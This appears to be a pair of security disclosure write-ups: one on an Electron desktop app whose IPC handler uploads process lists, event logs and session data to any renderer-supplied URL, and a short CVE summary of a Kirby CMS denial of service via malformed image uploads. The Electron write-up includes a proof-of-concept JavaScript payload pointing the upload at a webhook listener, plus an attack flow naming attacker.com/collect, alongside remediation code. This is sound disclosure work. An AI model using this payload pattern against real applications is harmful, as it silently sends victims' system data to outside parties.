title: Insecure IPC Channel Allows Sensitive System Data Exfiltration to Arbitrary External Endpoints
tags: IPC, SSRF, Data Exfiltration, Windows, Vulnerability-Research, Desktop-Application
content: An insecure IPC channel exposes a critical trust boundary violation, allowing arbitrary renderer-context code to exfiltrate sensitive system data to attacker-controlled endpoints. Overview While auditing an Electron-based desktop application, I discovered a critical IPC (Inter-Process Communication) trust boundary violation. The application exposes an IPC channel in the main process that blindly accepts a renderer-supplied upload URL and uses it to exfiltrate sensitive system data — without any domain validation, sender verification, or argument whitelisting. An attacker who can execute arbitrary JavaScript in the renderer context (via XSS, MITM injection, or supply chain compromise) can silently collect the victim’s system logs, running processes, and active sessions — and upload them to any external endpoint of their choice. Background: How Electron IPC Works Electron apps run two distinct processes. The renderer handles the UI (Chromium layer) while the main process has full OS access — it can execute shell commands, read files, and make network requests. They communicate through named IPC channels. ⚠️ Critical Rule: The main process must never blindly trust data sent by the renderer. In this case, that principle was completely ignored. The Vulnerability The application exposes an IPC channel intended for internal telemetry/monitoring. The handler in the main process: Accepts an attacker-controlled upload URL directly from the renderer payload Executes sensitive system commands on the victim’s machine (running process list, Windows Event logs, active user sessions) Packages the results into a ZIP archive Sends a PUT request to the attacker-supplied URL with the archive as the body There is no validation of: Whether the URL points to a trusted domain Whether the IPC message came from a legitimate renderer context Whether any of the parameters have been tampered with Attack Flow 🎯 Stage 1: Attack Entry XSS / MITM / Supply Chain 🔴 Stage 2: Renderer Compromised ⚠️ Malicious JavaScript Injected uploadUrl: attacker.com/collect 📡 Stage 3: IPC Message Sent ❌ No validation ⚙️ Stage 4: Main Process Handler Node.js with Full OS Access ❌ Accepts URL BLINDLY 🔧 Stage 5: Execute Commands Full Privileges - No Restrictions 📊 Processes PID, CPU, RAM 📋 Event Logs RDP Sessions 👤 Sessions Login History 📦 Stage 6: Archive Data ZIP Format ~19 KB 🚀 Stage 7: PUT Request attacker.com/collect 🔴 Stage 8: COMPROMISED ✓ Zero User Interaction ✗ Complete System Compromise Stage What Happens 1-2 Attacker injects JS + Renderer compromised 3-4 IPC message sent - NO validation 5-6 System commands executed with full privileges 7-8 Data packaged & silently exfiltrated Attack Scenarios Scenario 1: Man-in-the-Middle (MITM) Injection The application communicates over an unencrypted channel on a specific port. An attacker on the same network can intercept this traffic and inject a JavaScript payload into the renderer, triggering the vulnerable IPC handler. Scenario 2: XSS in Embedded Web Content If the UI renders any untrusted web content, a cross-site scripting payload can directly invoke the IPC channel with a malicious upload URL — with zero user interaction. Scenario 3: Supply Chain / Dependency Injection A compromised npm dependency bundled into the renderer can silently call the IPC at runtime — completely invisible to the user. Steps to Reproduce Since production builds disable DevTools, the PoC simulates renderer-context JavaScript execution by repacking the application’s ASAR bundle — the standard method for testing IPC security in Electron apps. Step 1 — Extract the Application Bundle npx asar extract app.asar app-extracted Step 2 — Inject the Payload setTimeout(() => { if (window.electronAPI) { window.electronAPI.send("<TARGET_IPC_CHANNEL>", { process_monitoring: true, screenshot_capturing: false, uploadUrl: "https://webhook.site/YOUR-LISTENER-ID", user_id: "poc_test", shouldCaptureInfo: true }); } }, 5000); Step 3 — Repack the Bundle npx asar pack app-extracted app.asar Step 4 — Launch and Observe Launch the application normally. After approximately 5 seconds, the attacker-controlled endpoint receives an inbound PUT request containing the victim’s full process table, event logs, and session data. Method: PUT User-Agent: axios/0.21.4 Content-Type: text/csv Content-Length: ~19 KB Impact Analysis Impact Description Data Exfiltration Windows Event logs (RDP sessions, process creation), full running process list with CPU/RAM, active user sessions Blind SSRF Main process can be forced to PUT data to any arbitrary external URL No User Interaction Fully silent once the renderer is compromised — no prompts, no warnings Broad Attack Surface Any renderer-level compromise (XSS, MITM, dependency attack) is sufficient to trigger Root Cause The main process trusts the renderer to supply critical parameters for a sensitive operation. The upload destination URL — which determines where victim data goes — originates entirely from the renderer payload with zero validation. Key Issue: The renderer is an untrusted environment by design. Allowing it to dictate the destination of sensitive data uploads is a direct violation of Electron’s security model. Recommendations 1. Strict URL Allowlisting Validate any upload URL against a hardcoded list of trusted domains before making any outbound request. Reject and log any non-matching URL silently. const ALLOWED_DOMAINS = ['api.internal.company.com', 's3.amazonaws.com']; const isAllowedUrl = new URL(uploadUrl).hostname; if (!ALLOWED_DOMAINS.includes(isAllowedUrl)) { console.error('Unauthorized upload URL'); return; } 2. Server-Side URL Generation The upload URL should never come from the renderer. The main process should request a pre-signed URL directly from the backend API using its own authenticated session. The renderer only sends a trigger signal. 3. IPC Sender Validation Verify that IPC messages originate from expected renderer frames using event.senderFrame.url before processing any arguments. ipcMain.handle('collect-telemetry', (event) => { if (!event.senderFrame.url.startsWith('app://')) { throw new Error('Unauthorized sender'); } // Process request... }); 4. Enable Full Electron Security Defaults Ensure contextIsolation: true, nodeIntegration: false, and sandbox: true for all renderer windows. Expose only explicitly defined, minimal APIs via contextBridge. 5. Argument Schema Validation Validate all IPC payloads against a strict schema before use. Any unexpected or out-of-spec parameter should cause the handler to abort immediately. const schema = { uploadUrl: 'string', process_monitoring: 'boolean', shouldCaptureInfo: 'boolean' }; for (const [key, type] of Object.entries(schema)) { if (typeof payload[key] !== type) { throw new Error(`Invalid argument type for ${key}`); } } References Electron Security Documentation — IPC Safety Electron Security Checklist CWE-441: Unintended Proxy or Intermediary CWE-918: Server-Side Request Forgery (SSRF) OWASP — SSRF Prevention Cheat Sheet Doyensec — Electron Security: Common Vulnerabilities electronegativity — Electron Security Analysis Tool CVSS v3.1 Calculator Writeup by Stalin S | Security Research | Electron Security Published: April 14, 2026

title: CVE-2026-29905 - Kirby CMS Persistent DoS via Malformed Image Upload
content: CVE-2026-29905 - Kirby CMS Persistent DoS via Malformed Image Upload CVE-2026-29905 has been officially published by MITRE. Overview An authenticated user with Editor permissions can upload a malformed file with an image extension to cause a persistent Denial of Service in Kirby CMS. CVE ID: CVE-2026-29905 Affected Version: Kirby CMS <= 5.1.4 Fixed In: Kirby CMS 5.2.0-rc.1 Severity: Medium CWE: CWE-252 (Unchecked Return Value), CWE-20 (Improper Input Validation) Description Kirby processes uploaded image files using PHP’s getimagesize() function without validating its return value. When a malformed file is uploaded with a valid image extension (e.g. .jpg), getimagesize() returns false instead of an array. The application then triggers a fatal TypeError during thumbnail generation or metadata processing. The crash persists across page reloads until the file is manually removed from the filesystem. Impact Any Editor-role user (non-admin) can trigger the DoS condition. Affected pages return HTTP 500 until the file is removed manually. Fix Patched in Kirby CMS 5.2.0-rc.1. References CVE-2026-29905 on cve.org CVE-2026-29905 on NVD GHSA-cw7v-45wm-mcf2 PoC – Stalin-143/CVE-2026-29905 Kirby CMS 5.2.0-rc.1 Release Supporting Document (Google Drive) Discoverer Stalin S (@Stalin-143)
